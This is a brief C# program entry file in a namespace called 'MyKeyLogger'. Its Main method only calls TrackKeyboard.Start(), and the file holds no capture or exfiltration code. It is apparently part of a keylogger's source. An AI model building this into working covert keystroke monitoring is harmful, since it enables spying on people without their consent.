﻿using System;

namespace MyKeyLogger
{
	class Program
	{
			public static void Main(string[] args)
		{
			TrackKeyboard.Start();
		}
}
	}